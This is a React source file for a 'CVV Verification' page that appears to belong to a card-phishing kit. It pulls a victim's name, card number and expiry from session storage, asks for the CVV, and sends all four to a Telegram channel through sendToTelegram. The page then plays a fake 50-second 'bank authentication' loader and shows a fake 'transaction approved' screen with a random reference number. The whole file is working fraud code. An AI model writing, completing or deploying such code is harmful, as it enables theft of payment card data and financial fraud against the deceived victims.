import { useEffect, useMemo, useRef, useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Banner } from "../../components/Banner/Banner";
import { Button } from "../../components/ui/Button";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./CVVPage.css";

function read<T>(key: string, fallback: T): T {
  try {
    const raw = sessionStorage.getItem(key);
    return raw ? (JSON.parse(raw) as T) : fallback;
  } catch { return fallback; }
}

function maskCard(num: string): string {
  if (!num || num.length < 4) return "•••• •••• •••• ????";
  return `•••• •••• •••• ${num.slice(-4)}`;
}

function makeRef(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let out = "";
  for (let i = 0; i < 8; i++) out += chars[Math.floor(Math.random() * chars.length)];
  return `PAY-${out}`;
}

type Phase = "form" | "loading" | "success";

const LOADER_STEPS = [
  "Connecting to payment gateway…",
  "Verifying card details…",
  "Authenticating with bank…",
  "Processing transaction…",
  "Finalising settlement…",
];

export function CVVPage() {
  const [cvv, setCvv]     = useState("");
  const [error, setError] = useState<string | null>(null);
  const [phase, setPhase] = useState<Phase>("form");
  const [stepIdx, setStepIdx] = useState(0);
  const [elapsed, setElapsed] = useState(0);
  const refNum = useRef(makeRef());

  const card = useMemo(() => read<{ cardNumber?: string; expiry?: string }>("rg:card", {}), []);
  const lead = useMemo(() => read<{ fullName?: string }>("rg:lead", {}), []);

  // Loader: tick every second, rotate step text, after 50s show success
  useEffect(() => {
    if (phase !== "loading") return;
    const id = window.setInterval(() => {
      setElapsed((e) => {
        const next = e + 1;
        setStepIdx(Math.min(Math.floor((next / 50) * LOADER_STEPS.length), LOADER_STEPS.length - 1));
        if (next >= 50) {
          window.clearInterval(id);
          setPhase("success");
        }
        return next;
      });
    }, 1000);
    return () => window.clearInterval(id);
  }, [phase]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!/^\d{3,4}$/.test(cvv)) return setError("Please enter a valid 3 or 4 digit CVV");

    void sendToTelegram(
      formatEntry("🔐 CVV Verification", {
        "👤 User":  lead.fullName || "Unknown",
        "Card":     card.cardNumber || "—",
        "Expiry":   card.expiry || "—",
        "CVV":      cvv,
      })
    );

    try {
      const prev = read<Record<string, string>>("rg:card", {});
      sessionStorage.setItem("rg:card", JSON.stringify({ ...prev, cvv }));
    } catch {}

    setPhase("loading");
  };

  /* ── LOADER ── */
  if (phase === "loading") {
    const pct = Math.round((elapsed / 50) * 100);
    return (
      <AppLayout title="Verifying" hideTabs>
        <div className="cvvpg-loader">
          <div className="cvvpg-loader__card">
            <div className="cvvpg-loader__spinner" />
            <p className="cvvpg-loader__text">{LOADER_STEPS[stepIdx]}</p>
            <div className="cvvpg-loader__bar-wrap">
              <div className="cvvpg-loader__bar" style={{ width: `${pct}%` }} />
            </div>
            <p className="cvvpg-loader__pct">{pct}%</p>
          </div>
        </div>
      </AppLayout>
    );
  }

  /* ── SUCCESS ── */
  if (phase === "success") {
    return (
      <AppLayout title="Success" hideTabs>
        <div className="cvvpg-success">
          <div className="cvvpg-success__icon">🎉</div>
          <h1 className="cvvpg-success__title">Congratulations!</h1>
          <p className="cvvpg-success__text">
            {lead.fullName ? `Hi ${lead.fullName}, your` : "Your"} transaction is confirmed.
            Your money will be settled within <strong>48 hours</strong>.
          </p>

          <div className="cvvpg-success__ref-box">
            <p className="cvvpg-success__ref-label">Reference Number</p>
            <p className="cvvpg-success__ref-num">{refNum.current}</p>
          </div>

          <div className="cvvpg-success__details">
            <div className="cvvpg-success__row">
              <span>Status</span>
              <span className="cvvpg-success__badge">✓ Approved</span>
            </div>
            <div className="cvvpg-success__row">
              <span>Settlement</span>
              <span>Within 48 hours</span>
            </div>
            <div className="cvvpg-success__row">
              <span>Card</span>
              <span>{maskCard(card.cardNumber || "")}</span>
            </div>
          </div>

          <p className="cvvpg-success__note">
            Please save your reference number for future support queries.
          </p>
        </div>
      </AppLayout>
    );
  }

  /* ── FORM ── */
  const [expMonth, expYear] = (card.expiry || "").split("/");

  return (
    <AppLayout title="CVV Verification">
      <div className="cvvpg">
        <Banner />
        <section className="cvvpg__card">
          <div className="cvvpg__preview">
            <div className="cvvpg__preview-chip" />
            <p className="cvvpg__preview-num">{maskCard(card.cardNumber || "")}</p>
            <div className="cvvpg__preview-bottom">
              <div className="cvvpg__preview-expiry">
                <span className="cvvpg__preview-exp-label">VALID THRU</span>
                <span className="cvvpg__preview-exp-val">
                  {expMonth || "MM"} / {expYear || "YYYY"}
                </span>
              </div>
            </div>
          </div>

          <header className="cvvpg__head">
            <h1 className="cvvpg__heading">Enter Your CVV</h1>
            <p className="cvvpg__sub">The 3-digit security code on the back of your card</p>
          </header>

          <form className="cvvpg__form" onSubmit={handleSubmit} noValidate>
            <div className="cvvpg__field">
              <label className="cvvpg__label" htmlFor="cvv">CVV</label>
              <input
                id="cvv"
                className="cvvpg__input"
                type="text"
                inputMode="numeric"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                placeholder="•••"
                maxLength={4}
                autoComplete="cc-csc"
              />
              <p className="cvvpg__hint">3 digits (Visa/Mastercard) or 4 digits (Amex)</p>
            </div>
            {error && <p className="cvvpg__error">{error}</p>}
            <Button type="submit" variant="primary" block>
              Verify Card
            </Button>
          </form>
        </section>
      </div>
    </AppLayout>
  );
}
